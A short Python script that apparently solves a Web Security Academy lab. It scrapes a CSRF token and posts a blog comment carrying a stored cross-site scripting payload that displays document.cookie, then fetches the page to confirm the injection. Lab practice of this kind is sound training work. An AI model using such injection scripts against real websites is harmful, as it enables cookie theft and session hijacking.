import requests
from bs4 import BeautifulSoup
s = requests.Session()
site = 'acd81fb61e52354d80c68b8000f2008c.web-security-academy.net'

blog_post_url = f'https://{site}/post?postId=1'
resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'
comment_string = '''"<script>alert(document.cookie)</script>'''
comment_data = {
    'csrf' : csrf,
    'postId' : '1',
    'comment' : comment_string,
    'name' : 'Chance',
    'email' : 'spurgeonc@sou.edu',
    'website': 'https://sou.edu'
}
resp = s.post(comment_url, data=comment_data)
resp = s.get(blog_post_url)
print(resp.text)